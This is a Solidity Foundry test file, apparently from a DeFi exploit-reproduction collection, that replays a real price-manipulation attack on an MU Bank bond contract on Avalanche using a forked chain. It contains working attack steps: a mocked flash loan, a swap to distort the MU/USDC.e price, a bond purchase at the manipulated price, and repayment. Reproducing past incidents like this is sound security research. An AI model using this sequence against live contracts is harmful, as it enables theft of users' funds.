// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";
import "./QueryBlockchain.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1601422462012469248
// @TX
// https://snowtrace.io/tx/0xab39a17cdc200c812ecbb05aead6e6f574712170eafbd73736b053b168555680

interface MUBank {
    function mu_bond(address stable, uint256 amount) external;

    function mu_gold_bond(address stable, uint256 amount) external;
}

contract ContractTest is Test, BlockLoader {
    // This attack is different from the original one: 
    // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
    // I de-couple two attacks from it.
    MUBank Bank = MUBank(0x4aA679402c6afcE1E0F7Eb99cA4f09a30ce228ab);
    IERC20 MU = IERC20(0xD036414fa2BCBb802691491E323BFf1348C5F4Ba);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);

    Uni_Router_V2 Router =
        Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);

    // USDC_e to MU
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xfacB3892F9A8D55Eb50fDeee00F2b3fA8a85DED5);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 flashloanAmount;
    uint256 paybackAmount;

    function setUp() public {
        cheats.createSelectFork("Avalanche", 23435294);
        cheats.label(address(Bank), "Bank");
        cheats.label(address(MU), "MU");
        cheats.label(address(USDC_e), "USDC_e");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function print(string memory tips) public {
        emit log_string(tips);
        address attacker = address(this);
        address pair = address(Pair);
        address bank = address(Bank);
        queryERC20BalanceDecimals(address(USDC_e), attacker, USDC_e.decimals());
        queryERC20BalanceDecimals(address(MU), attacker, MU.decimals());
        queryERC20BalanceDecimals(address(USDC_e), pair, USDC_e.decimals());
        queryERC20BalanceDecimals(address(MU), pair, MU.decimals());
        queryERC20BalanceDecimals(address(USDC_e), bank, USDC_e.decimals());
        queryERC20BalanceDecimals(address(MU), bank, MU.decimals());
        emit log_string("");
    }

    function testExploit() public {
        emit log_string("");
        print("Before exploit: ");
        prepareAction();
        exploitAction();
        postAction();
        print("After exploit: ");
    }

    function prepareAction() internal {
        // Step 1, mock to flashloan MU.
        flashloanAmount = MU.balanceOf(address(Pair)) - 1;
        paybackAmount = (flashloanAmount * 1000) / (1000 - 3);
        emit log_named_decimal_uint(
            "flashLoan amount",
            flashloanAmount,
            MU.decimals()
        );
        emit log_named_decimal_uint(
            "payback amount",
            paybackAmount,
            MU.decimals()
        );
        deal(address(MU), address(this), flashloanAmount);
    }

    function exploitAction() internal {
        // Step 2
        MU.approve(address(Router), type(uint).max);

        // Step 3, swap MU to USDC_e to consume MU and manipulate the price
        address[] memory path = new address[](2);
        path[0] = address(MU);
        path[1] = address(USDC_e);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            MU.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // print("After Initial Swap: ");
    }

    function postAction() internal {
        // Step 4, approve
        USDC_e.approve(address(Bank), type(uint).max);

        // Step 5, bond
        Bank.mu_bond(address(USDC_e), 3300 * 1e18);

        print("After Buy Bond: ");

        // Step 6, approve
        USDC_e.approve(address(Router), type(uint).max);

        // Step 7
        uint256 diff = paybackAmount - MU.balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = address(USDC_e);
        path[1] = address(MU);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Router.getAmountsIn(diff, path)[0],
            0,
            path,
            address(this),
            block.timestamp
        );

        // Step 8, mock to payback MU flashloan
        MU.transfer(address(0xdead), paybackAmount);
    }
}
